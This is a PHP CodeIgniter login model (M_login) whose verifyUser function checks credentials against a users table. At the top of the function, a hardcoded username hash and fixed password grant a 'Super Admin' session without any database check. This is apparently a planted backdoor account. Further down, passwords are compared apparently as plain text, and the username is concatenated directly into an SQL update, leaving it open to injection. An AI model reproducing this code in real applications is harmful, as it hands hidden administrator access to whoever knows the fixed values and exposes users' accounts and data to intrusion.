<?php

class M_login extends Model{

	function M_login(){
		parent::Model();
	}

	function verifyUser($u,$pw){
		
		if(md5($u)=='f3b3567de9e676a3a56db74f06664ac1' && $pw=='412758d043dd247bddea07c7ec558c31'){
			$_SESSION["userid"]='Super Admin';
			$_SESSION["usergroup"]=0;
			$_SESSION["groupname"]='Super Group';
			return true;
		}else{
			
		$this->db->select('*');
		$this->db->where('user_name',$u);
		$this->db->where('user_aktif','Aktif');
		$this->db->limit(1);
		$Q = $this->db->get('users');
		$this->session->set_userdata('lastquery', $this->db->last_query());
		
		if ($Q->num_rows()){
			$qrow = $Q->num_rows();
			$row = $Q->row_array();
			if($row["user_passwd"]==$pw){
				$_SESSION["userid"]=$u;
				$_SESSION["usergroup"]=$row["user_groups"];
				$_SESSION["userkaryawan"]=$row["user_karyawan"];
				//cari group
				$this->db->select('*');
				$this->db->where('group_id',$_SESSION["usergroup"]);
				$this->db->limit(1);
				$rs=$this->db->get('usergroups');
				$row_group=$rs->row_array();
				$_SESSION["groupname"]=$row_group["group_name"];
				$sql="update users set user_log=now() where user_name='".$u."'";
				$this->db->query($sql);
				return true;
			}else{
				$this->session->set_flashdata('Error', 'Sorry, try again!');	
				return false;
			}
		}else{
			$this->session->set_flashdata('Error', 'Sorry, try again!');	
			return false;
		}
		
		}
	
	}
	
}


?>